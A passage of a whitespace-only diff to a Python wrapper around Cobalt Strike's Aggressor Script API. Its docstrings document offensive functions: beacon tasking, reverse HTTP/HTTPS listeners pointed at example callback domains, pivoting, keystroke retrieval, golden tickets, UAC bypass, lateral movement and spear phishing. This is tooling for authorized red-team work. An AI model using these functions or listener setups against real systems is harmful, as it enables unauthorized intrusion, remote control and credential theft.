         $1 - the beacon id to run the alias against
         $2 - the alias name to run
         $3 - the arguments to pass to the alias.
         Example
-        
+
         # run the foo alias when a new Beacon comes in
         on beacon_initial {
             fireAlias($1, "foo", "bar!");
         }
-        
+
     """
 
     return engine.call('fireAlias', args, fork=fork)
@@ -3485,19 +3485,19 @@ def fireAlias(*args, fork=False):
 def fireEvent(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Fire an event.
         Arguments
         $1 - the event name
         ... - the event arguments.
         Example
-        
+
         on foo {
             println("Argument is: $1");
         }
-        
+
         fireEvent("foo", "Hello World!");
-        
+
     """
 
     return engine.call('fireEvent', args, fork=fork)
@@ -3506,17 +3506,17 @@ def fireEvent(*args, fork=False):
 def format_size(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Formats a number into a size (e.g., 1024 => 1kb)
         Arguments
         $1 - the size to format
         Returns
         A string representing a human readable data size.
         Example
-        
+
         println(format_size(1024));
-        
-        
+
+
     """
 
     return engine.call('format_size', args, fork=fork)
@@ -3525,19 +3525,19 @@ def format_size(*args, fork=False):
 def gunzip(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Decompress a string (GZIP).
         Arguments
         $1 - the string to compress
         Returns
         The argument processed by the gzip de-compressor
         Example
-        
+
         println(gunzip(gzip("this is a test")));
-        
+
         See Also
         &gzip
-        
+
     """
 
     return engine.call('gunzip', args, fork=fork)
@@ -3546,16 +3546,16 @@ def gunzip(*args, fork=False):
 def gzip(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         GZIP a string.
         Arguments
         $1 - the string to compress
         Returns
         The argument processed by the gzip compressor
         Example
-        
+
         println(gzip("this is a test"));
-        
+
         See Also
         &gunzip
     """
@@ -3566,15 +3566,15 @@ def gzip(*args, fork=False):
 def host_delete(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Delete a host from the targets model
         Arguments
         $1 - the IPv4 or IPv6 address of this target [you may specify an array of hosts too]
         Example
-        
+
         # clear all hosts
         host_delete(hosts());
-        
+
     """
 
     return engine.call('host_delete', args, fork=fork)
@@ -3583,22 +3583,22 @@ def host_delete(*args, fork=False):
 def host_info(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Get information about a target.
         Arguments
         $1 - the host IPv4 or IPv6 address
         $2 - [Optional] the key to extract a value for
         Returns
-        
+
         %info = host_info("address");
-        
+
         Returns a dictionary with known information about this target.
-        
+
         $value = host_info("address", "key");
-        
+
         Returns the value for the specified key from this target's entry in the data model.
         Example
-        
+
         # create a script console alias to dump host info
         command host {
             println("Host $1");
@@ -3606,7 +3606,7 @@ def host_info(*args, fork=False):
                 println("$[15]key $value");
             }
         }
-        
+
     """
 
     return engine.call('host_info', args, fork=fork)
@@ -3615,7 +3615,7 @@ def host_info(*args, fork=False):
 def host_update(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Add or update a host in the targets model
         Arguments
         $1 - the IPv4 or IPv6 address of this target [you may specify an array of hosts too]
@@ -3626,9 +3626,9 @@ def host_update(*args, fork=False):
         Note
         You may specify a $null value for any argument and, if the host exists, no change will be made to that value.
         Example
-        
+
         host_update("192.168.20.3", "DC", "Windows", 10.0);
-        
+
     """
 
     return engine.call('host_update', args, fork=fork)
@@ -3637,14 +3637,14 @@ def host_update(*args, fork=False):
 def hosts(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Returns a list of IP addresses from Cobalt Strike's target model
         Returns
         An array of IP addresses
         Example
-        
+
         printAll(hosts());
-        
+
     """
 
     return engine.call('hosts', args, fork=fork)
@@ -3653,21 +3653,21 @@ def hosts(*args, fork=False):
 def insert_menu(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Bring menus associated with a popup hook into the current menu tree.
         Arguments
         $1 - the popup hook
         ... - additional arguments are passed to the child popup hook.
         Example
-        
+
         popup beacon {
             # menu definitions above this point
-        
+
             insert_menu("beacon_bottom", $1);
-        
+
             # menu definitions below this point
         }
-        
+
     """
 
     return engine.call('insert_menu', args, fork=fork)
@@ -3676,42 +3676,42 @@ def insert_menu(*args, fork=False):
 def iprange(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Generate an array of IPv4 addresses based on a string description
         Arguments
         $1 - a string with a description of IPv4 ranges
-        
-        
+
+
         Range
         Result
-        
-        
+
+
         192.168.1.2
         The IP4 address 192.168.1.2
-        
-        
+
+
         192.168.1.1, 192.168.1.2
         The IPv4 addresses 192.168.1.1 and 192.168.1.2
-        
-        
+
+
         192.168.1.0/24
         The IPv4 addresses 192.168.1.0 through 192.168.1.255
-        
-        
+
+
         192.168.1.18-192.168.1.30
         The IPv4 addresses 192.168.1.18 through 192.168.1.29
-        
-        
+
+
         192.168.1.18-30
         The IPv4 addresses 192.168.1.18 through 192.168.1.29
-        
-        
+
+
         Returns
         An array of IPv4 addresses within the specified ranges.
         Example
-        
+
         printAll(iprange("192.168.1.0/25"));
-        
+
     """
 
     return engine.call('iprange', args, fork=fork)
@@ -3720,14 +3720,14 @@ def iprange(*args, fork=False):
 def keystrokes(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Returns a list of keystrokes from Cobalt Strike's data model.
         Returns
         An array of dictionary objects with information about recorded keystrokes.
         Example
-        
+
         printAll(keystrokes());
-        
+
     """
 
     return engine.call('keystrokes', args, fork=fork)
@@ -3736,14 +3736,14 @@ def keystrokes(*args, fork=False):
 def licenseKey(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Get the license key for this instance of Cobalt Strike
         Returns
         Your license key.
         Example
-        
+
         println("Your key is: " . licenseKey());
-        
+
     """
 
     return engine.call('licenseKey', args, fork=fork)
@@ -3752,7 +3752,7 @@ def licenseKey(*args, fork=False):
 def listener_create(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Create a new listener.
         Arguments
         $1 - the listener name
@@ -3761,16 +3761,16 @@ def listener_create(*args, fork=False):
         $4 - the listener port
         $5 - a comma separated list of addresses for listener to beacon to
         Example
-        
+
         # create a foreign listener
         listener_create("My Metasploit", "windows/foreign_https/reverse_https",
                 "ads.losenolove.com", 443);
-        
+
         # create an HTTP Beacon listener
         listener_create("Beacon HTTP", "windows/beacon_http/reverse_http",
                 "www.losenolove.com", 80,
                 "www.losenolove.com, www2.losenolove.com");
-        
+
     """
 
     return engine.call('listener_create', args, fork=fork)
@@ -3779,14 +3779,14 @@ def listener_create(*args, fork=False):
 def listener_delete(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Stop and remove a listener.
         Arguments
         $1 - the listener name
         Example
-        
+
         listener_delete("Beacon HTTP");
-        
+
     """
 
     return engine.call('listener_delete', args, fork=fork)
@@ -3795,7 +3795,7 @@ def listener_delete(*args, fork=False):
 def listener_describe(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Describe a listener.
         Arguments
         $1 - the listener name
@@ -3803,11 +3803,11 @@ def listener_describe(*args, fork=False):
         Returns
         A string describing the listener
         Example
-        
+
         foreach $name (listeners()) {
             println("$name is: " . listener_describe($name));
         }
-        
+
     """
 
     return engine.call('listener_describe', args, fork=fork)
@@ -3816,22 +3816,22 @@ def listener_describe(*args, fork=False):
 def listener_info(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Get information about a listener.
         Arguments
         $1 - the listener name
         $2 - [Optional] the key to extract a value for
         Returns
-        
+
         %info = listener_info("listener name");
-        
+
         Returns a dictionary with the metadata for this listener.
-        
+
         $value = listener_info("listener name", "key");
-        
+
         Returns the value for the specified key from this listener's metadata
         Example
-        
+
         # create a script console alias to dump listener info
         command dump {
             println("Listener $1");
@@ -3839,7 +3839,7 @@ def listener_info(*args, fork=False):
                 println("$[15]key $value");
             }
         }
-        
+
     """
 
     return engine.call('listener_info', args, fork=fork)
@@ -3848,7 +3848,7 @@ def listener_info(*args, fork=False):
 def listener_pivot_create(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Create a new pivot listener.
         Arguments
         $1 - the Beacon ID
@@ -3859,22 +3859,22 @@ def listener_pivot_create(*args, fork=False):
         Note
         The only valid payload argument is windows/beacon_reverse_tcp.
         Example
-        
+
         # create a pivot listener:
         # $1 = beaconID, $2 = name, $3 = port
         alias plisten {
             local('$lhost $bid $name $port');
-        
+
             # extract our arguments
             ($bid, $name, $port) = @_;
-        
+
             # get the name of our target
             $lhost = beacon_info($1, "computer");
-        
+
             btask($1, "create TCP listener on $lhost $+ : $+ $port");
             listener_pivot_create($1, $name, "windows/beacon_reverse_tcp", $lhost, $port);
         }
-        
+
     """
 
     return engine.call('listener_pivot_create', args, fork=fork)
@@ -3883,14 +3883,14 @@ def listener_pivot_create(*args, fork=False):
 def listener_restart(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Restart a listener
         Arguments
         $1 - the listener name
         Example
-        
+
         listener_restart("Beacon HTTP");
-        
+
     """
 
     return engine.call('listener_restart', args, fork=fork)
@@ -3899,14 +3899,14 @@ def listener_restart(*args, fork=False):
 def listeners(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Return a list of listener names across all team servers this client is connected to.
         Returns
         An array of listener names.
         Example
-        
+
         printAll(listeners());
-        
+
     """
 
     return engine.call('listeners', args, fork=fork)
@@ -3915,14 +3915,14 @@ def listeners(*args, fork=False):
 def listeners_local(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Return a list of listener names. This function limits itself to the current team server only.
         Returns
         An array of listener names.
         Example
-        
+
         printAll(listeners_local());
-        
+
     """
 
     return engine.call('listeners_local', args, fork=fork)
@@ -3931,14 +3931,14 @@ def listeners_local(*args, fork=False):
 def localip(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Get the IP address associated with the team server.
         Returns
         A string with the team server's IP address.
         Example
-        
+
         println("I am: " . localip());
-        
+
     """
 
     return engine.call('localip', args, fork=fork)
@@ -3947,14 +3947,14 @@ def localip(*args, fork=False):
 def mynick(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Get the nickname associated with the current Cobalt Strike client.
         Returns
         A string with your nickname.
         Example
-        
+
         println("I am: " . mynick());
-        
+
     """
 
     return engine.call('mynick', args, fork=fork)
@@ -3963,14 +3963,14 @@ def mynick(*args, fork=False):
 def nextTab(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Activate the tab that is to the right of the current tab.
         Example
-        
+
         bind Ctrl+Right {
             nextTab();
         }
-        
+
     """
 
     return engine.call('nextTab', args, fork=fork)
@@ -3979,19 +3979,19 @@ def nextTab(*args, fork=False):
 def on(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Register an event handler. This is an alternate to the on keyword.
         Arguments
         $1 - the name of the event to respond to
         $2 - a callback function. Called when the event happens.
         Example
-        
+
         sub foo {
             blog($1, "Foo!");
         }
-        
+
         on("beacon_initial", &foo);
-        
+
     """
 
     return engine.call('on', args, fork=fork)
@@ -4000,12 +4000,12 @@ def on(*args, fork=False):
 def openAboutDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the "About Cobalt Strike" dialog
         Example
-        
+
         openAboutDialog();
-        
+
     """
 
     return engine.call('openAboutDialog', args, fork=fork)
@@ -4014,12 +4014,12 @@ def openAboutDialog(*args, fork=False):
 def openApplicationManager(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the application manager (system profiler results) tab.
         Example
-        
+
         openApplicationManager();
-        
+
     """
 
     return engine.call('openApplicationManager', args, fork=fork)
@@ -4028,12 +4028,12 @@ def openApplicationManager(*args, fork=False):
 def openAutoRunDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the Auto Run / USB attack dialog.
         Example
-        
+
         openAutoRunDialog();
-        
+
     """
 
     return engine.call('openAutoRunDialog', args, fork=fork)
@@ -4042,12 +4042,12 @@ def openAutoRunDialog(*args, fork=False):
 def openBeaconBrowser(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the beacon browser tab.
         Example
-        
+
         openBeaconBrowser();
-        
+
     """
 
     return engine.call('openBeaconBrowser', args, fork=fork)
@@ -4056,19 +4056,19 @@ def openBeaconBrowser(*args, fork=False):
 def openBeaconConsole(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the console to interact with a Beacon
         Arguments
         $1 - the Beacon ID to apply this feature to
         Example
-        
+
         item "Interact" {
             local('$bid');
             foreach $bid ($1) {
                 openBeaconConsole($bid);
             }
         }
-        
+
     """
 
     return engine.call('openBeaconConsole', args, fork=fork)
@@ -4077,19 +4077,19 @@ def openBeaconConsole(*args, fork=False):
 def openBrowserPivotSetup(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         open the browser pivot setup dialog
         Arguments
         $1 - the Beacon ID to apply this feature to
         Example
-        
+
         item "Browser Pivoting" {
             local('$bid');
             foreach $bid ($1) {
                 openBrowserPivotSetup($bid);
             }
         }
-        
+
     """
 
     return engine.call('openBrowserPivotSetup', args, fork=fork)
@@ -4098,19 +4098,19 @@ def openBrowserPivotSetup(*args, fork=False):
 def openBypassUACDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the dialog for the Bypass UAC feature.
         Arguments
         $1 - the beacon ID
         Example
-        
+
         item "Bypass UAC" {
             local('$bid');
             foreach $bid ($1) {
                 openBypassUACDialog($bid);
             }
         }
-        
+
     """
 
     return engine.call('openBypassUACDialog', args, fork=fork)
@@ -4119,12 +4119,12 @@ def openBypassUACDialog(*args, fork=False):
 def openCloneSiteDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the dialog for the website clone tool.
         Example
-        
+
         openCloneSiteDialog();
-        
+
     """
 
     return engine.call('openCloneSiteDialog', args, fork=fork)
@@ -4133,12 +4133,12 @@ def openCloneSiteDialog(*args, fork=False):
 def openConnectDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the connect dialog.
         Example
-        
+
         openConnectDialog();
-        
+
     """
 
     return engine.call('openConnectDialog', args, fork=fork)
@@ -4147,19 +4147,19 @@ def openConnectDialog(*args, fork=False):
 def openCovertVPNSetup(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         open the Covert VPN setup dialog
         Arguments
         $1 - the Beacon ID to apply this feature to
         Example
-        
+
         item "VPN Pivoting" {
             local('$bid');
             foreach $bid ($1) {
                 openCovertVPNSetup($bid);
             }
         }
-        
+
     """
 
     return engine.call('openCovertVPNSetup', args, fork=fork)
@@ -4168,12 +4168,12 @@ def openCovertVPNSetup(*args, fork=False):
 def openCredentialManager(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the credential manager tab.
         Example
-        
+
         openCredentialManager();
-        
+
     """
 
     return engine.call('openCredentialManager', args, fork=fork)
@@ -4182,12 +4182,12 @@ def openCredentialManager(*args, fork=False):
 def openDownloadBrowser(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the download browser tab
         Example
-        
+
         openDownloadBrowser();
-        
+
     """
 
     return engine.call('openDownloadBrowser', args, fork=fork)
@@ -4196,19 +4196,19 @@ def openDownloadBrowser(*args, fork=False):
 def openElevateDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the dialog to launch a privilege escalation exploit.
         Arguments
         $1 - the beacon ID
         Example
-        
+
         item "Elevate" {
             local('$bid');
             foreach $bid ($1) {
                 openElevateDialog($bid);
             }
         }
-        
+
     """
 
     return engine.call('openElevateDialog', args, fork=fork)
@@ -4217,12 +4217,12 @@ def openElevateDialog(*args, fork=False):
 def openEventLog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the event log.
         Example
-        
+
         openEventLog();
-        
+
     """
 
     return engine.call('openEventLog', args, fork=fork)
@@ -4231,19 +4231,19 @@ def openEventLog(*args, fork=False):
 def openFileBrowser(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the file browser for a Beacon
         Arguments
         $1 - the Beacon ID to apply this feature to
         Example
-        
+
         item "Browse Files" {
             local('$bid');
             foreach $bid ($1) {
                 openFileBrowser($bid);
             }
         }
-        
+
     """
 
     return engine.call('openFileBrowser', args, fork=fork)
@@ -4252,19 +4252,19 @@ def openFileBrowser(*args, fork=False):
 def openGoldenTicketDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         open a dialog to help generate a golden ticket
         Arguments
         $1 - the Beacon ID to apply this feature to
         Example
-        
+
         item "Golden Ticket" {
             local('$bid');
             foreach $bid ($1) {
                 openGoldenTicketDialog($bid);
             }
         }
-        
+
     """
 
     return engine.call('openGoldenTicketDialog', args, fork=fork)
@@ -4273,12 +4273,12 @@ def openGoldenTicketDialog(*args, fork=False):
 def openHTMLApplicationDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the HTML Application Dialog.
         Example
-        
+
         openHTMLApplicationDialog();
-        
+
     """
 
     return engine.call('openHTMLApplicationDialog', args, fork=fork)
@@ -4287,12 +4287,12 @@ def openHTMLApplicationDialog(*args, fork=False):
 def openHostFileDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the host file dialog.
         Example
-        
+
         openHostFileDialog();
-        
+
     """
 
     return engine.call('openHostFileDialog', args, fork=fork)
@@ -4301,12 +4301,12 @@ def openHostFileDialog(*args, fork=False):
 def openInterfaceManager(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the tab to manage Covert VPN interfaces
         Example
-        
+
         openInterfaceManager();
-        
+
     """
 
     return engine.call('openInterfaceManager', args, fork=fork)
@@ -4315,12 +4315,12 @@ def openInterfaceManager(*args, fork=False):
 def openJavaSignedAppletDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the Java Signed Applet dialog
         Example
-        
+
         openJavaSignedAppletDialog();
-        
+
     """
 
     return engine.call('openJavaSignedAppletDialog', args, fork=fork)
@@ -4329,12 +4329,12 @@ def openJavaSignedAppletDialog(*args, fork=False):
 def openJavaSmartAppletDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the Java Smart Applet dialog
         Example
-        
+
         openJavaSmartAppletDialog();
-        
+
     """
 
     return engine.call('openJavaSmartAppletDialog', args, fork=fork)
@@ -4343,15 +4343,15 @@ def openJavaSmartAppletDialog(*args, fork=False):
 def openJumpDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open Cobalt Strike's lateral movement dialog
         Arguments
         $1 - the type of lateral movement. One of: psexec, psexec_psh, winrm, wmi
         $2 - an array of targets to apply this action against
         Example
-        
+
         openJumpDialog("psexec_psh", @("192.168.1.3", "192.168.1.4"));
-        
+
     """
 
     return engine.call('openJumpDialog', args, fork=fork)
@@ -4360,12 +4360,12 @@ def openJumpDialog(*args, fork=False):
 def openKeystrokeBrowser(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the keystroke browser tab
         Example
-        
+
         openKeystrokeBrowser();
-        
+
     """
 
     return engine.call('openKeystrokeBrowser', args, fork=fork)
@@ -4374,12 +4374,12 @@ def openKeystrokeBrowser(*args, fork=False):
 def openListenerManager(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the listener manager
         Example
-        
+
         openListenerManager();
-        
+
     """
 
     return engine.call('openListenerManager', args, fork=fork)
@@ -4388,19 +4388,19 @@ def openListenerManager(*args, fork=False):
 def openMakeTokenDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         open a dialog to help generate an access token
         Arguments
         $1 - the Beacon ID to apply this feature to
         Example
-        
+
         item "Make Token" {
             local('$bid');
             foreach $bid ($1) {
                 openMakeTokenDialog($bid);
             }
         }
-        
+
     """
 
     return engine.call('openMakeTokenDialog', args, fork=fork)
@@ -4409,12 +4409,12 @@ def openMakeTokenDialog(*args, fork=False):
 def openOfficeMacro(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the office macro export dialog
         Example
-        
+
         openOfficeMacroDialog();
-        
+
     """
 
     return engine.call('openOfficeMacro', args, fork=fork)
@@ -4423,19 +4423,19 @@ def openOfficeMacro(*args, fork=False):
 def openOrActivate(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         If a Beacon console exists, make it active. If a Beacon console does not exist, open it.
         Arguments
         $1 - the Beacon ID
         Example
-        
+
         item "&Activate" {
             local('$bid');
             foreach $bid ($1) {
                 openOrActivate($bid);
             }
         }
-        
+
     """
 
     return engine.call('openOrActivate', args, fork=fork)
@@ -4444,12 +4444,12 @@ def openOrActivate(*args, fork=False):
 def openPayloadGeneratorDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the Payload Generator dialog.
         Example
-        
+
         openPayloadGeneratorDialog();
-        
+
     """
 
     return engine.call('openPayloadGeneratorDialog', args, fork=fork)
@@ -4458,16 +4458,16 @@ def openPayloadGeneratorDialog(*args, fork=False):
 def openPayloadHelper(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open a payload chooser dialog.
         Arguments
         $1 - a callback function. Arguments: $1 - the selected listener.
         Example
-        
+
         openPayloadHelper(lambda({
             bspawn($bid, $1);
         }, $bid => $1));
-        
+
     """
 
     return engine.call('openPayloadHelper', args, fork=fork)
@@ -4476,19 +4476,19 @@ def openPayloadHelper(*args, fork=False):
 def openPivotListenerSetup(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         open the pivot listener setup dialog
         Arguments
         $1 - the Beacon ID to apply this feature to
         Example
-        
+
         item "Listener..." {
             local('$bid');
             foreach $bid ($1) {
                 openPivotListenerSetup($bid);
             }
         }
-        
+
     """
 
     return engine.call('openPivotListenerSetup', args, fork=fork)
@@ -4497,14 +4497,14 @@ def openPivotListenerSetup(*args, fork=False):
 def openPortScanner(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the port scanner dialog
         Arguments
         $1 - an array of targets to scan
         Example
-        
+
         openPortScanner(@("192.168.1.3"));
-        
+
     """
 
     return engine.call('openPortScanner', args, fork=fork)
@@ -4513,19 +4513,19 @@ def openPortScanner(*args, fork=False):
 def openPortScannerLocal(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the port scanner dialog with options to target a Beacon's local network
         Arguments
         $1 - the beacon to target with this feature
         Example
-        
+
         item "Scan" {
             local('$bid');
             foreach $bid ($1) {
                 openPortScannerLocal($bid);
             }
         }
-        
+
     """
 
     return engine.call('openPortScannerLocal', args, fork=fork)
@@ -4534,12 +4534,12 @@ def openPortScannerLocal(*args, fork=False):
 def openPowerShellWebDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the dialog to setup the PowerShell Web Delivery Attack
         Example
-        
+
         openPowerShellWebDialog();
-        
+
     """
 
     return engine.call('openPowerShellWebDialog', args, fork=fork)
@@ -4548,12 +4548,12 @@ def openPowerShellWebDialog(*args, fork=False):
 def openPreferencesDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the preferences dialog
         Example
-        
+
         openPreferencesDialog();
-        
+
     """
 
     return engine.call('openPreferencesDialog', args, fork=fork)
@@ -4562,16 +4562,16 @@ def openPreferencesDialog(*args, fork=False):
 def openProcessBrowser(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open a process browser for one or more Beacons
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         Example
-        
+
         item "Processes" {
             openProcessBrowser($1);
         }
-        
+
     """
 
     return engine.call('openProcessBrowser', args, fork=fork)
@@ -4580,12 +4580,12 @@ def openProcessBrowser(*args, fork=False):
 def openSOCKSBrowser(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the tab to list SOCKS proxy servers
         Example
-        
+
         openSOCKSBrowser();
-        
+
     """
 
     return engine.call('openSOCKSBrowser', args, fork=fork)
@@ -4594,19 +4594,19 @@ def openSOCKSBrowser(*args, fork=False):
 def openSOCKSSetup(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         open the SOCKS proxy server setup dialog
         Arguments
         $1 - the Beacon ID to apply this feature to
         Example
-        
+
         item "SOCKS Server" {
             local('$bid');
             foreach $bid ($1) {
                 openSOCKSSetup($bid);
             }
         }
-        
+
     """
 
     return engine.call('openSOCKSSetup', args, fork=fork)
@@ -4615,12 +4615,12 @@ def openSOCKSSetup(*args, fork=False):
 def openScreenshotBrowser(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the screenshot browser tab
         Example
-        
+
         openScreenshotBrowser();
-        
+
     """
 
     return engine.call('openScreenshotBrowser', args, fork=fork)
@@ -4629,12 +4629,12 @@ def openScreenshotBrowser(*args, fork=False):
 def openScriptConsole(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the Aggressor Script console.
         Example
-        
+
         openScriptConsole();
-        
+
     """
 
     return engine.call('openScriptConsole', args, fork=fork)
@@ -4643,12 +4643,12 @@ def openScriptConsole(*args, fork=False):
 def openScriptManager(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the tab for the script manager.
         Example
-        
+
         openScriptManager();
-        
+
     """
 
     return engine.call('openScriptManager', args, fork=fork)
@@ -4657,12 +4657,12 @@ def openScriptManager(*args, fork=False):
 def openScriptedWebDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the dialog to setup a Scripted Web Delivery Attack
         Example
-        
+
         openScriptedWebDialog();
-        
+
     """
 
     return engine.call('openScriptedWebDialog', args, fork=fork)
@@ -4671,14 +4671,14 @@ def openScriptedWebDialog(*args, fork=False):
 def openServiceBrowser(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open service browser dialog
         Arguments
         $1 - an array of targets to show services for
         Example
-        
+
         openServiceBrowser(@("192.168.1.3"));
-        
+
     """
 
     return engine.call('openServiceBrowser', args, fork=fork)
@@ -4687,12 +4687,12 @@ def openServiceBrowser(*args, fork=False):
 def openSiteManager(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the site manager.
         Example
-        
+
         openSiteManager();
-        
+
     """
 
     return engine.call('openSiteManager', args, fork=fork)
@@ -4701,19 +4701,19 @@ def openSiteManager(*args, fork=False):
 def openSpawnAsDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open dialog to spawn a payload as another user
         Arguments
         $1 - the Beacon ID to apply this feature to
         Example
-        
+
         item "Spawn As..." {
             local('$bid');
             foreach $bid ($1) {
                 openSpawnAsDialog($bid);
             }
         }
-        
+
     """
 
     return engine.call('openSpawnAsDialog', args, fork=fork)
@@ -4722,12 +4722,12 @@ def openSpawnAsDialog(*args, fork=False):
 def openSpearPhishDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the dialog for the spear phishing tool.
         Example
-        
+
         openSpearPhishDialog();
-        
+
     """
 
     return engine.call('openSpearPhishDialog', args, fork=fork)
@@ -4736,12 +4736,12 @@ def openSpearPhishDialog(*args, fork=False):
 def openSystemInformationDialog(*args, fork=False):
     r"""
